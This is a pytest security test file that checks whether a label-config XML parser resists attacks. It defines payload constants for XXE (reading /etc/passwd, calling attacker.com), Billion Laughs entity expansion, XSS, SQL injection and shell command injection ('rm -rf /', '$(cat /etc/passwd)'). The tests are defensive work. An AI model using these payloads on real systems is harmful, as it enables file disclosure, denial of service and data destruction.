"""
Security tests for label config validation
Tests XXE, entity expansion, and injection attacks
Issue #798: Label config security validation

This test suite verifies that label_config XML parsing is protected against:
- XXE (XML External Entity) attacks
- Billion Laughs / Entity Expansion attacks
- Script injection (XSS)
- SQL injection
- Command injection

Note: These tests verify that the CURRENT implementation is vulnerable and serve
as a specification for the security fixes that need to be implemented.
"""

from unittest.mock import Mock, patch

import pytest

from label_config_version_service import LabelConfigVersionService
from project_models import Project

# ============================================================================
# Attack Payloads
# ============================================================================

XXE_FILE_PAYLOAD = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<View><Text name="&xxe;" value="$text"/></View>
'''

XXE_SSRF_PAYLOAD = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/steal">]>
<View><Text name="&xxe;" value="$text"/></View>
'''

XXE_PARAMETER_ENTITY_PAYLOAD = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<View><Text name="test" value="$text"/></View>
'''

BILLION_LAUGHS_PAYLOAD = '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<View><Text name="&lol4;" value="$text"/></View>
'''

ENTITY_EXPANSION_PAYLOAD = '''<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "aaaaaaaaaa">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
]>
<View><Text name="&c;" value="$text"/></View>
'''

SCRIPT_INJECTION_PAYLOAD = '''<View>
<Text name="<script>alert('XSS')</script>" value="$text"/>
</View>'''

SCRIPT_TAG_ATTR_PAYLOAD = '''<View>
<Text name="test" value="<script>alert('XSS')</script>"/>
</View>'''

SQL_INJECTION_PAYLOAD = '''<View>
<Text name="test'; DROP TABLE users;--" value="$text"/>
</View>'''

SQL_INJECTION_ATTR_PAYLOAD = '''<View>
<Text name="test" value="' OR '1'='1"/>
</View>'''

COMMAND_INJECTION_PAYLOAD = '''<View>
<Text name="test; rm -rf /" value="$text"/>
</View>'''

COMMAND_INJECTION_ATTR_PAYLOAD = '''<View>
<Text name="test" value="$(cat /etc/passwd)"/>
</View>'''


# ============================================================================
# Test Classes
# ============================================================================


class TestXXEPrevention:
    """Test protection against XML External Entity (XXE) attacks"""

    def test_xxe_file_disclosure(self):
        """
        Test that XXE file disclosure attacks are blocked

        XXE attacks attempt to read local files by declaring external entities.
        The parser should either disable DTD processing or use defusedxml.
        """
        mock_project = Mock(spec=Project)
        mock_project.label_config = None
        mock_project.label_config_version = None
        mock_project.label_config_history = None
        mock_project.created_by = "test-user"

        # Attempt to extract field names from XXE payload
        # This should either raise an error or return empty list
        try:
            fields = LabelConfigVersionService._extract_field_names(XXE_FILE_PAYLOAD)
            # If parsing succeeds, verify no sensitive data is exposed
            for field in fields:
                # Check that field doesn't contain system file content
                assert not field.startswith("root:"), "XXE attack succeeded - file content exposed"
                assert "passwd" not in field.lower(), "XXE attack succeeded - passwd file leaked"
        except Exception as e:
            # Parsing should fail for XXE payloads
            # Valid exceptions: ParseError, ValueError, or custom security error
            assert any(
                err in str(type(e).__name__)
                for err in ['ParseError', 'ValueError', 'SecurityError', 'DTDForbidden']
            )

    def test_xxe_ssrf_attack(self):
        """
        Test that XXE SSRF (Server-Side Request Forgery) attacks are blocked

        XXE can be used to make the server send requests to internal/external URLs.
        """
        mock_project = Mock(spec=Project)
        mock_project.label_config = None
        mock_project.label_config_version = None
        mock_project.label_config_history = None
        mock_project.created_by = "test-user"

        # Mock network calls to detect SSRF attempts
        with patch('urllib.request.urlopen') as mock_urlopen:
            try:
                fields = LabelConfigVersionService._extract_field_names(XXE_SSRF_PAYLOAD)
                # Verify no network requests were made
                assert mock_urlopen.call_count == 0, "XXE SSRF attack succeeded - HTTP request made"
                # Verify no attacker-controlled content
                for field in fields:
                    assert "attacker.com" not in field, "XXE SSRF content included in output"
            except Exception:
                # Expected to fail
                pass

    def test_xxe_parameter_entity(self):
        """
        Test that XXE parameter entity attacks are blocked

        Parameter entities (%) can be used for more complex XXE attacks.
        """
        mock_project = Mock(spec=Project)
        mock_project.label_config = None
        mock_project.label_config_version = None
        mock_project.label_config_history = None
        mock_project.created_by = "test-user"

        try:
            fields = LabelConfigVersionService._extract_field_names(XXE_PARAMETER_ENTITY_PAYLOAD)
            # Should not contain entity references
            for field in fields:
                assert not field.startswith("&"), "Parameter entity not resolved securely"
                assert "%" not in field, "Parameter entity markers present"
        except Exception as e:
            # Expected to fail on parameter entities
            assert any(
                err in str(type(e).__name__)
                for err in ['ParseError', 'ValueError', 'SecurityError']
            )


class TestEntityExpansionPrevention:
    """Test protection against Billion Laughs and entity expansion attacks"""

    def test_billion_laughs_attack(self):
        """
        Test that Billion Laughs DoS attack is blocked

        This attack uses nested entity expansion to cause exponential memory growth.
        The parser should limit entity expansion depth/count.
        """
        mock_project = Mock(spec=Project)
        mock_project.label_config = None
        mock_project.label_config_version = None
        mock_project.label_config_history = None
        mock_project.created_by = "test-user"

        # Set a memory limit to detect expansion
        import tracemalloc

        tracemalloc.start()

        try:
            fields = LabelConfigVersionService._extract_field_names(BILLION_LAUGHS_PAYLOAD)
            current, peak = tracemalloc.get_traced_memory()
            tracemalloc.stop()

            # If parsing succeeded, verify memory usage is reasonable
            # Peak memory should be < 10MB for this simple XML
            assert (
                peak < 10 * 1024 * 1024
            ), f"Billion Laughs attack succeeded - excessive memory used: {peak / 1024 / 1024}MB"

            # Verify output doesn't contain massively expanded content
            for field in fields:
                assert len(field) < 10000, "Entity expansion created huge field names"
        except Exception as e:
            # Expected to fail - entity expansion should be blocked
            tracemalloc.stop()
            assert any(
                err in str(type(e).__name__)
                for err in ['ParseError', 'ValueError', 'SecurityError', 'EntitiesForbidden']
            )

    def test_entity_expansion_limit(self):
        """
        Test that entity expansion is limited to prevent DoS

        Even smaller entity expansions should be limited.
        """
        mock_project = Mock(spec=Project)
        mock_project.label_config = None
        mock_project.label_config_version = None
        mock_project.label_config_history = None
        mock_project.created_by = "test-user"

        try:
            fields = LabelConfigVersionService._extract_field_names(ENTITY_EXPANSION_PAYLOAD)
            # Verify expansion didn't create huge strings
            total_length = sum(len(field) for field in fields)
            assert (
                total_length < 100000
            ), f"Entity expansion created {total_length} chars - expansion not limited"
        except Exception:
            # Expected to fail
            pass


class TestInjectionPrevention:
    """Test protection against injection attacks (XSS, SQL, Command)"""

    def test_script_tag_sanitization(self):
        """
        Test that script tags in XML are sanitized or rejected

        Script tags should be escaped or removed to prevent XSS when
        label config is displayed in the frontend.
        """
        mock_project = Mock(spec=Project)
        mock_project.label_config = None
        mock_project.label_config_version = None
        mock_project.label_config_history = None
        mock_project.created_by = "test-user"

        try:
            fields = LabelConfigVersionService._extract_field_names(SCRIPT_INJECTION_PAYLOAD)
            # Verify script tags are not present in output
            for field in fields:
                assert "<script>" not in field.lower(), "Script tag not sanitized"
                assert "alert(" not in field.lower(), "JavaScript code not sanitized"
                # If tags are escaped, that's acceptable
                if "script" in field.lower():
                    assert "&lt;" in field or field.startswith(
                        "&"
                    ), "Script tag present but not escaped"
        except Exception:
            # Rejecting the entire payload is also acceptable
            pass

    def test_script_tag_in_attributes(self):
        """Test that script tags in XML attributes are sanitized"""
        mock_project = Mock(spec=Project)
        mock_project.label_config = None
        mock_project.label_config_version = None
        mock_project.label_config_history = None
        mock_project.created_by = "test-user"

        # Parse with script in attribute
        try:
            fields = LabelConfigVersionService._extract_field_names(SCRIPT_TAG_ATTR_PAYLOAD)
            # Field name should be "test", value should be sanitized or rejected
            assert "test" in fields
            # The value attribute shouldn't leak into field names
            for field in fields:
                if field != "test":
                    assert "<script>" not in field.lower()
        except Exception:
            # Rejecting malformed XML is acceptable
            pass

    def test_sql_injection_attempt(self):
        """
        Test that SQL injection payloads in XML are neutralized

        While label configs aren't directly used in SQL queries,
        they should still be sanitized to prevent stored XSS or
        second-order SQL injection.
        """
        mock_project = Mock(spec=Project)
        mock_project.label_config = None
        mock_project.label_config_version = None
        mock_project.label_config_history = None
        mock_project.created_by = "test-user"

        try:
            fields = LabelConfigVersionService._extract_field_names(SQL_INJECTION_PAYLOAD)
            # Verify SQL injection patterns are escaped or rejected
            for field in fields:
                # These patterns should not appear unescaped
                assert "DROP TABLE" not in field, "SQL injection payload not sanitized"
                assert "'--" not in field, "SQL comment syntax not sanitized"
                assert field != "test'; DROP TABLE users;--", "SQL injection preserved exactly"
        except Exception:
            # Rejecting is acceptable
            pass

    def test_sql_injection_in_attributes(self):
        """Test SQL injection in XML attributes"""
        mock_project = Mock(spec=Project)
        mock_project.label_config = None
        mock_project.label_config_version = None
        mock_project.label_config_history = None
        mock_project.created_by = "test-user"

        try:
            fields = LabelConfigVersionService._extract_field_names(SQL_INJECTION_ATTR_PAYLOAD)
            # Should get "test" as field name
            assert "test" in fields
            # SQL payload should not leak into field names
            for field in fields:
                assert "' OR '" not in field or field == "test"
        except Exception:
            pass

    def test_command_injection(self):
        """
        Test that shell command injection is neutralized

        Command injection patterns should be sanitized even though
        label configs aren't used in shell commands directly.
        """
        mock_project = Mock(spec=Project)
        mock_project.label_config = None
        mock_project.label_config_version = None
        mock_project.label_config_history = None
        mock_project.created_by = "test-user"

        try:
            fields = LabelConfigVersionService._extract_field_names(COMMAND_INJECTION_PAYLOAD)
            # Verify command injection patterns are sanitized
            for field in fields:
                assert "rm -rf" not in field, "Command injection not sanitized"
                assert "; rm" not in field, "Shell command separator not sanitized"
        except Exception:
            # Rejecting is acceptable
            pass

    def test_command_injection_in_attributes(self):
        """Test command injection in XML attributes"""
        mock_project = Mock(spec=Project)
        mock_project.label_config = None
        mock_project.label_config_version = None
        mock_project.label_config_history = None
        mock_project.created_by = "test-user"

        try:
            fields = LabelConfigVersionService._extract_field_names(COMMAND_INJECTION_ATTR_PAYLOAD)
            # Should get "test" as field name
            assert "test" in fields
            # Command injection should not leak
            for field in fields:
                assert "$(cat" not in field or field == "test"
                assert "/etc/passwd" not in field
        except Exception:
            pass


# ============================================================================
# Integration Tests
# ============================================================================


class TestLabelConfigSecurityIntegration:
    """Integration tests for label config security in real scenarios"""

    def test_version_history_with_malicious_config(self):
        """
        Test that version history doesn't store malicious configs

        When updating a project with a malicious label config,
        the system should reject it before storing in history.
        """
        mock_project = Mock(spec=Project)
        mock_project.label_config = "<View><Text name='safe' value='$text'/></View>"
        mock_project.label_config_version = "v1"
        mock_project.label_config_history = {"versions": {}}
        mock_project.created_by = "test-user"

        # Attempt to update with XXE payload
        try:
            new_version = LabelConfigVersionService.update_version_history(
                project=mock_project,
                new_label_config=XXE_FILE_PAYLOAD,
                description="Malicious update",
                user_id="attacker-user",
            )

            # If update succeeded, verify the payload was sanitized
            assert mock_project.label_config != XXE_FILE_PAYLOAD, "Malicious config stored verbatim"

            # Check that no file content was read
            assert "root:" not in str(mock_project.label_config_history)
            assert "/etc/passwd" not in str(mock_project.label_config_history)
        except Exception:
            # Rejecting malicious configs is the preferred behavior
            pass

    def test_compare_versions_with_malicious_schemas(self):
        """Test that version comparison doesn't execute malicious code"""
        mock_project = Mock(spec=Project)
        safe_config = "<View><Text name='field1' value='$text'/></View>"
        mock_project.label_config = safe_config
        mock_project.label_config_version = "v2"
        mock_project.label_config_history = {
            "versions": {
                "v1": {
                    "schema": XXE_FILE_PAYLOAD,
                    "created_at": "2025-01-01T00:00:00",
                    "created_by": "attacker",
                    "description": "Malicious",
                    "schema_hash": "abc123",
                }
            }
        }

        # Compare safe v2 with malicious v1
        try:
            result = LabelConfigVersionService.compare_versions(mock_project, "v1", "v2")

            # Verify comparison doesn't expose sensitive data
            assert "root:" not in str(result)
            assert "/etc/passwd" not in str(result)
        except Exception:
            # Expected to fail when processing malicious schema
            pass


# ============================================================================
# Test Markers
# ============================================================================

# Mark all tests in this file as security tests
pytestmark = pytest.mark.security
